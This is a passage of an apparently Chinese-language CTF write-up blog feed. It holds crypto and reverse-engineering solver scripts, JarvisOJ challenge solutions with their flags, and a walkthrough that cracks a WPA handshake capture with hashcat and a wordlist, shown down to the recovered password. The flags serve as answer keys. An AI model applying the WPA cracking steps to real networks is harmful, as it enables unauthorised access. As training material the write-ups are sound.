class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#求出加密的比特位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipherText)</span>:</span></span><br><span class="line">    guessed_bits = [<span class="string">'?'</span>] * len(cipherText)</span><br><span class="line">    length = len(cipherText)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    orded_cipher = [ord(c) &amp; <span class="number">1</span> <span class="keyword">for</span> c <span class="keyword">in</span> cipherText]</span><br><span class="line">    decrypt_r(orded_cipher, guessed_bits, i, length, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_guess</span><span class="params">(orded_cipher, guessedbits, i, length, guess, space)</span>:</span></span><br><span class="line">    guessedbits = list(guessedbits)</span><br><span class="line">    guessedbits[i] = guess</span><br><span class="line">    <span class="keyword">if</span> i + space &lt; length - <span class="number">1</span>:</span><br><span class="line">        nextndx = i + space</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        nextndx = space</span><br><span class="line"></span><br><span class="line">    nextbit = orded_cipher[i] ^ guess</span><br><span class="line">    <span class="keyword">if</span> guess == <span class="number">0</span>:</span><br><span class="line">        newspace = space + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        newspace = space - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> guessedbits[nextndx] == <span class="string">'?'</span> <span class="keyword">or</span> guessedbits[nextndx] == nextbit:</span><br><span class="line">        guessedbits[nextndx] = nextbit</span><br><span class="line">        decrypt_r(orded_cipher, guessedbits, i + <span class="number">1</span>, length, newspace)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_r</span><span class="params">(orded_cipher, guessedbits, i, length, space)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> i &gt;= length:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok:'</span>, <span class="string">''</span>.join(str(c) <span class="keyword">for</span> c <span class="keyword">in</span> guessedbits)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> guessedbits[i] == <span class="string">'?'</span>:</span><br><span class="line">        try_guess(orded_cipher, guessedbits, i, length, <span class="number">0</span>, space)</span><br><span class="line">        try_guess(orded_cipher, guessedbits, i, length, <span class="number">1</span>, space)</span><br><span class="line">    <span class="keyword">elif</span> guessedbits[i] == <span class="number">0</span>:</span><br><span class="line">        try_guess(orded_cipher, guessedbits, i, length, <span class="number">0</span>, space)</span><br><span class="line">    <span class="keyword">elif</span> guessedbits[i] == <span class="number">1</span>:</span><br><span class="line">        try_guess(orded_cipher, guessedbits, i, length, <span class="number">1</span>, space)</span><br><span class="line"><span class="comment">#print ''.join(str(c) for c in guessedbits)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s=<span class="string">'15120d1a0a0810010a031d3e31000d1d170d173b0d173b0c07060206'</span></span><br><span class="line"><span class="comment">#print len(s)</span></span><br><span class="line">s=s.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="comment">#print len(s)</span></span><br><span class="line"></span><br><span class="line">decrypt(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#求出明文</span></span><br><span class="line">sln=<span class="string">'1010011010010101111111101001'</span></span><br><span class="line">ciph=s</span><br><span class="line"><span class="keyword">print</span> sln</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">slv = [<span class="keyword">None</span>] * len(sln)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filling_pass</span><span class="params">(slv)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        any = <span class="keyword">False</span></span><br><span class="line">        space = <span class="number">10</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sln)):</span><br><span class="line">            <span class="keyword">if</span> i + space &lt; len(sln) - <span class="number">1</span>:</span><br><span class="line">                nx = i + space</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                nx = space</span><br><span class="line">            <span class="keyword">if</span> sln[i] == <span class="string">'0'</span>:</span><br><span class="line">                space += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                space -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> slv[i] <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                sn = ord(slv[i]) ^ ord(ciph[i])</span><br><span class="line">                <span class="keyword">if</span> slv[nx] <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">                    slv[nx] = chr(sn)</span><br><span class="line">                    <span class="keyword">if</span> (sn &gt;= <span class="number">32</span> <span class="keyword">and</span> sn &lt; <span class="number">127</span>) <span class="keyword">or</span> sn == <span class="number">10</span> <span class="keyword">or</span> sn == <span class="number">13</span>:</span><br><span class="line">                        any = <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> slv[nx] != chr(sn):</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> any:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tryit</span><span class="params">(slvo, start)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> slvo[start] <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> start &gt;= len(slvo):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">''</span>.join(<span class="string">' '</span> <span class="keyword">if</span> c <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">else</span> <span class="string">'.'</span> <span class="keyword">if</span> ord(c) &lt; <span class="number">32</span> <span class="keyword">else</span> c <span class="keyword">for</span> c <span class="keyword">in</span> slvo)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        slv = list(slvo)</span><br><span class="line">        slv[start] = c</span><br><span class="line">        possible = filling_pass(slv)</span><br><span class="line">        <span class="keyword">if</span> possible:</span><br><span class="line">            tryit(slv, start)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> tryit(slv, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{cryptanalysis_is_hard}</code></p><h2 id="Fast-LFSR"><a href="#Fast-LFSR" class="headerlink" title="Fast LFSR"></a>Fast LFSR</h2><h3 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h3><p>使用LFSR生成流密钥，具体名称是Geffe Generator</p><p>攻击方式是快速相关攻击（Fast Correlation Attack）</p><p>原题出自强网杯StreamGame3，出题的时候还搜不到可用的WP</p><p>具体请查看论文以及网上WP如<a href="http://blog.leanote.com/post/xp0intjnu@gmail.com/66c91498d13b" target="_blank" rel="noopener">这篇</a></p><h3 id="flag-13"><a href="#flag-13" class="headerlink" title="flag"></a>flag</h3><p><code>afctf{01abcd056789123456}</code></p>]]></content>
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JarvisOJ-WP合集</title>
      <link href="/JarvisOJ-WP%E5%90%88%E9%9B%86/"/>
      <url>/JarvisOJ-WP%E5%90%88%E9%9B%86/</url>
      <content type="html"><![CDATA[<p> 因为预感进度表会很长，所以不放了</p><a id="more"></a><h1 id="不资瓷跳转的进度表"><a href="#不资瓷跳转的进度表" class="headerlink" title="不资瓷跳转的进度表"></a>不资瓷跳转的进度表</h1><ul><li style="list-style: none"><input type="checkbox" checked> Basic<ul><li style="list-style: none"><input type="checkbox" checked> base64</li><li style="list-style: none"><input type="checkbox" checked> 关于USS Lab.</li><li style="list-style: none"><input type="checkbox" checked> veryeasy</li><li style="list-style: none"><input type="checkbox" checked> 段子</li><li style="list-style: none"><input type="checkbox" checked> 手贱</li><li style="list-style: none"><input type="checkbox" checked> 美丽的实验室logo</li><li style="list-style: none"><input type="checkbox" checked> 神秘的文件</li><li style="list-style: none"><input type="checkbox" checked> 公倍数</li><li style="list-style: none"><input type="checkbox" checked> Easy Crackme</li><li style="list-style: none"><input type="checkbox" checked> Secret</li><li style="list-style: none"><input type="checkbox" checked> 爱吃培根的出题人</li><li style="list-style: none"><input type="checkbox" checked> Easy RSA</li><li style="list-style: none"><input type="checkbox" checked> ROPGadget</li><li style="list-style: none"><input type="checkbox" checked> 取证</li><li style="list-style: none"><input type="checkbox" checked> 熟悉的声音</li><li style="list-style: none"><input type="checkbox" checked> Baby&#39;s Crack</li><li style="list-style: none"><input type="checkbox" checked> Help!!</li><li style="list-style: none"><input type="checkbox" checked> Shellcode</li><li style="list-style: none"><input type="checkbox" checked> A Piece Of Cake</li><li style="list-style: none"><input type="checkbox" checked> -.-字符串</li><li style="list-style: none"><input type="checkbox" checked> 德军的密码</li><li style="list-style: none"><input type="checkbox" checked> 握手包</li></ul></li><li style="list-style: none"><input type="checkbox" checked> Crypto<ul><li style="list-style: none"><input type="checkbox" checked> Medium RSA</li><li style="list-style: none"><input type="checkbox"> BrokenPic</li><li style="list-style: none"><input type="checkbox" checked> hard RSA</li></ul></li></ul><h1 id="X-Basic"><a href="#X-Basic" class="headerlink" title="[Ｘ] Basic"></a>[Ｘ] Basic</h1><h2 id="X-base64"><a href="#X-base64" class="headerlink" title="[Ｘ] base64"></a>[Ｘ] base64</h2><p>注意到没有小写字母和大点的数字，猜测是base32，解完以后是一个十六进制字符串，转ASCII解得</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>PCTF{Just_t3st_h4v3_f4n}</p><h2 id="X-关于USS-Lab"><a href="#X-关于USS-Lab" class="headerlink" title="[Ｘ] 关于USS Lab."></a>[Ｘ] 关于USS Lab.</h2><p>搜索得到答案，注意题目里说的是USS Lab。</p><p>顺便其实点开about就能看到全称（233</p><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>PCTF{ubiquitous_system_security}</p><h2 id="X-veryeasy"><a href="#X-veryeasy" class="headerlink" title="[Ｘ] veryeasy"></a>[Ｘ] veryeasy</h2><p>打开文件我就知道要用strings命令，但是我就不，我就翻</p><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p>PCTF{strings_i5_3asy_isnt_i7}</p><h2 id="X-段子"><a href="#X-段子" class="headerlink" title="[Ｘ] 段子"></a>[Ｘ] 段子</h2><p>将锟斤拷存ANSI编码，然后HEX编辑器打开就好</p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p>PCTF{EFBFBDEFBFBD}</p><h2 id="X-手贱"><a href="#X-手贱" class="headerlink" title="[Ｘ] 手贱"></a>[Ｘ] 手贱</h2><p>直接解MD5，然后发现说不是标准MD5值，发现长度为33</p><p>再看看具体的，发现里面有个$L$的小写，删了解MD5得flag</p><h3 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h3><p>PCTF{hack}</p><h2 id="X-美丽的实验室logo"><a href="#X-美丽的实验室logo" class="headerlink" title="[Ｘ] 美丽的实验室logo"></a>[Ｘ] 美丽的实验室logo</h2><p>binwalk没有额外东西</p><p>但是可以发现不是裸的jpg，strings可以看到Adobe公司工具编辑的痕迹，回去继续</p><hr><p>不对，用Stegsolver的Frame Browser看到了flag</p><h3 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h3><p>PCTF{You_are_R3ally_Car3ful}</p><h2 id="X-veryeasyRSA"><a href="#X-veryeasyRSA" class="headerlink" title="[Ｘ] veryeasyRSA"></a>[Ｘ] veryeasyRSA</h2><p>RSA-tool直接上啦~</p><img src="/JarvisOJ-WP合集/1525919629975.png" title="veryeasyRSA"><h3 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h3><p>PCTF{19178568796155560423675975774142829153827883709027717723363077606260717434369}</p><h2 id="X-神秘的文件"><a href="#X-神秘的文件" class="headerlink" title="[Ｘ] 神秘的文件"></a>[Ｘ] 神秘的文件</h2><p>file/binwalk指令得到这是一个exT文件系统数据，strings结果也奇怪</p><img src="/JarvisOJ-WP合集/1525920969858.png" title="神秘的文件"><p>索性打开文件看，发现有一堆\x00</p><p>但是往下翻发现有些其他东西</p><img src="/JarvisOJ-WP合集/1525921057979.png" title="神秘的文件_2"><p>然后找到P/C/T，想着能不能移除<code>\x00</code>得到flag</p><p>然后的确得到了，但是结果失败了</p><img src="/JarvisOJ-WP合集/1525922016986.png" title="神秘的文件_3"><p>因为错位包括前后错位，所以直接拼凑也是会失败的</p><p>看来还是需要文件系统，用命令</p><p><code>mount -o loop haha.f38a74f55b4e193561d1b707211cf7eb /mnt</code></p><p>装载文件系统之后，发现每个文件里一个字符，所以写出脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">254</span>):</span><br><span class="line">f = open(str(i), <span class="string">"r"</span>)</span><br><span class="line">s += f.read()</span><br><span class="line">f.close()</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h3><p>PCTF{P13c3_7oghter_i7}</p><h2 id="X-公倍数"><a href="#X-公倍数" class="headerlink" title="[Ｘ] 公倍数"></a>[Ｘ] 公倍数</h2><p>1s大概做1e8的计算，所以可以直接暴力算就好</p><p>代码就没必要放了吧~</p><h3 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h3><p>PCTF{233333333166666668}</p><h2 id="X-Easy-Crackme"><a href="#X-Easy-Crackme" class="headerlink" title="[Ｘ] Easy Crackme"></a>[Ｘ] Easy Crackme</h2><img src="/JarvisOJ-WP合集/1525966589251.png" title="Easy Crackme"><p>算法很简单，第一位异或以后，后面24位每6位一组和对应位置异或，然后进行比较</p><p>写出逆算法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">27</span>] = &#123;</span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0x9E</span>, <span class="number">0x67</span>, <span class="number">0x12</span>, <span class="number">0x4E</span>, <span class="number">0x9D</span>, <span class="number">0x98</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x46</span>, <span class="number">0x8A</span>, <span class="number">0xF4</span>, <span class="number">0xB4</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>,</span><br><span class="line">    <span class="number">0x43</span>, <span class="number">0xDC</span>, <span class="number">0xD9</span>, <span class="number">0xA4</span>, <span class="number">0x6C</span>, <span class="number">0x31</span>, <span class="number">0x74</span>, <span class="number">0x9C</span>, <span class="number">0xD2</span>, <span class="number">0xA0</span>, <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> ar[<span class="number">6</span>] = &#123;<span class="number">-35</span>,<span class="number">51</span>,<span class="number">84</span>,<span class="number">53</span>,<span class="number">-17</span>,<span class="number">-85</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">a[<span class="number">0</span>]^=<span class="number">0xab</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;++i)&#123;</span><br><span class="line">a[i+<span class="number">1</span>]^=ar[i%<span class="number">6</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h3><p>PCTF{r3v3Rse_i5_v3ry_eAsy}</p><h2 id="X-Secret"><a href="#X-Secret" class="headerlink" title="[Ｘ]  Secret"></a>[Ｘ]  Secret</h2><p>打开，F12，网络，刷新，得到</p><img src="/JarvisOJ-WP合集/1525960605970.png" title="Secret"><h3 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h3><p>PCTF{Welcome_to_phrackCTF_2016}</p><h2 id="X-爱吃培根的出题人"><a href="#X-爱吃培根的出题人" class="headerlink" title="[Ｘ]  爱吃培根的出题人"></a>[Ｘ]  爱吃培根的出题人</h2><p>提示够明显了，小写字母-&gt;A，大写字母-&gt;B，<a href="https://mothereff.in/bacon" target="_blank" rel="noopener">培根密码解密</a></p><h3 id="flag-11"><a href="#flag-11" class="headerlink" title="flag"></a>flag</h3><h2 id="X-Easy-RSA"><a href="#X-Easy-RSA" class="headerlink" title="[Ｘ] Easy RSA"></a>[Ｘ] Easy RSA</h2><p>提示明显</p><h3 id="flag-12"><a href="#flag-12" class="headerlink" title="flag"></a>flag</h3><p>PCTF{3a5Y}</p><h2 id="X-ROPGadget"><a href="#X-ROPGadget" class="headerlink" title="[Ｘ] ROPGadget"></a>[Ｘ] ROPGadget</h2><img src="/JarvisOJ-WP合集/1525961626864.png" title="ROPGadget"><h3 id="flag-13"><a href="#flag-13" class="headerlink" title="flag"></a>flag</h3><p>PCTF{94C38B08890A5BC3}</p><h2 id="X-取证"><a href="#X-取证" class="headerlink" title="[Ｘ] 取证"></a>[Ｘ] 取证</h2><p>搜索得软件名Volatility</p><h3 id="flag-14"><a href="#flag-14" class="headerlink" title="flag"></a>flag</h3><p>PCTF{volatility}</p><h2 id="X-熟悉的声音"><a href="#X-熟悉的声音" class="headerlink" title="[Ｘ] 熟悉的声音"></a>[Ｘ] 熟悉的声音</h2><p>摩尔斯-&gt;凯撒</p><h3 id="flag-15"><a href="#flag-15" class="headerlink" title="flag"></a>flag</h3><p>PCTF{PHRACKCTF}</p><h2 id="X-Baby-39-s-Crack"><a href="#X-Baby-39-s-Crack" class="headerlink" title="[Ｘ] Baby&#39;s Crack"></a>[Ｘ] Baby&#39;s Crack</h2><p>很简单的加密，都不用写逆算法了，直接爆破吧！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"jeihjiiklwjnk&#123;ljj&#123;kflghhj&#123;ilk&#123;k&#123;kij&#123;ihlgkfkhkwhhjgly"</span>;</span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"jeihjiiklwjnk&#123;ljj&#123;kflghhj&#123;ilk&#123;k&#123;kij&#123;ihlgkfkhkwhhjgly"</span>;<span class="comment">//这里可以为空，我只是方便设置长度搞得</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(a);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line"><span class="keyword">int</span> ok = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">32</span>;j&lt;<span class="number">255</span>&amp;&amp;!ok;++j)&#123;</span><br><span class="line"><span class="keyword">int</span> cur = j;</span><br><span class="line"><span class="keyword">if</span> ( j &gt; <span class="number">47</span> &amp;&amp; j &lt;= <span class="number">96</span> )&#123;</span><br><span class="line">          j += <span class="number">53</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> ( j &lt;= <span class="number">46</span> )&#123;</span><br><span class="line">          j += j % <span class="number">11</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          j = <span class="number">61</span> * (j / <span class="number">61</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j==a[i])&#123;</span><br><span class="line">        <span class="comment">//ok=1;这里加上注释是为了确认每次解的唯一</span></span><br><span class="line">        b[i]=cur;</span><br><span class="line">        <span class="built_in">putchar</span>(cur);</span><br><span class="line">        &#125;</span><br><span class="line">        j=cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到的结果转ASCII就好</p><h3 id="flag-16"><a href="#flag-16" class="headerlink" title="flag"></a>flag</h3><p>PCTF{You_ar3_Good_Crack3R}</p><h2 id="X-Help"><a href="#X-Help" class="headerlink" title="[Ｘ] Help!!"></a>[Ｘ] Help!!</h2><img src="/JarvisOJ-WP合集/1525968750571.png" title="Help!!"><p>打开word没有发现flag，binwalk/strings也没有</p><p>于是解压word，发现有两张图，OK</p><h3 id="flag-17"><a href="#flag-17" class="headerlink" title="flag"></a>flag</h3><p>PCTF{You_Know_moR3_4boUt_woRd}</p><h2 id="X-Shellcode"><a href="#X-Shellcode" class="headerlink" title="[Ｘ] Shellcode"></a>[Ｘ] Shellcode</h2><img src="/JarvisOJ-WP合集/1525973282058.png" title="Shellcode"><h3 id="flag-18"><a href="#flag-18" class="headerlink" title="flag"></a>flag</h3><p>PCTF{Begin_4_good_pwnn3r}</p><h2 id="X-A-Piece-Of-Cake"><a href="#X-A-Piece-Of-Cake" class="headerlink" title="[Ｘ] A Piece Of Cake"></a>[Ｘ] A Piece Of Cake</h2><p>一眼就看出来是单表替换，quip解决</p><h3 id="flag-19"><a href="#flag-19" class="headerlink" title="flag"></a>flag</h3><p>PCTF{substitutepassisveryeasyyougotit}</p><h2 id="X-字符串"><a href="#X-字符串" class="headerlink" title="[Ｘ] -.-字符串"></a>[Ｘ] -.-字符串</h2><p>一目了然</p><h3 id="flag-20"><a href="#flag-20" class="headerlink" title="flag"></a>flag</h3><p>522018D665387D1DA931812B77763410</p><h2 id="X-德军的密码"><a href="#X-德军的密码" class="headerlink" title="[Ｘ] 德军的密码"></a>[Ｘ] 德军的密码</h2><img src="/JarvisOJ-WP合集/1525970989136.png" title="德军的密码"><p>然后解得flag</p><h3 id="flag-21"><a href="#flag-21" class="headerlink" title="flag"></a>flag</h3><p>WELCOMECISRG</p><h2 id="X-握手包"><a href="#X-握手包" class="headerlink" title="[Ｘ] 握手包"></a>[Ｘ] 握手包</h2><p>下载发现是个cap包，中文搜索无果，搜&quot;Kali handshake crack&quot;，搜到hashcat，找到<a href="https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2" target="_blank" rel="noopener">这个网站</a></p><p>照葫芦画瓢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">A:\Downloads\Compressed\hashcat-4.1.0</span><br><span class="line">λ hashcat64.exe -m 2500 9640_1525972232.hccapx rockyou.txt</span><br><span class="line">hashcat (v4.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">"CL_OUT_OF_RESOURCES"</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">* Device <span class="comment">#2: Intel's OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">nvmlDeviceGetFanSpeed(): Not Supported</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#1: GeForce GTX 965M, 512/2048 MB allocatable, 8MCU</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#2: Intel(R) HD Graphics 530, skipped.</span></span><br><span class="line">* Device <span class="comment">#3: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Slow-Hash-SIMD-LOOP</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 8</span><br><span class="line">Maximum password length supported by kernel: 63</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: rockyou.txt</span><br><span class="line">* Passwords.: 14344390</span><br><span class="line">* Bytes.....: 139921496</span><br><span class="line">* Keyspace..: 14344383</span><br><span class="line">* Runtime...: 3 secs</span><br><span class="line"></span><br><span class="line">e56452df7244988624af174fa692d81d:560a64ffe917:b8ee65ac640b:Flag_is_here:11223344</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: WPA/WPA2</span><br><span class="line">Hash.Target......: Flag_is_here (AP:56:0a:64:ff:e9:17 STA:b8:ee:65:ac:64:0b)</span><br><span class="line">Time.Started.....: Fri May 11 01:17:21 2018 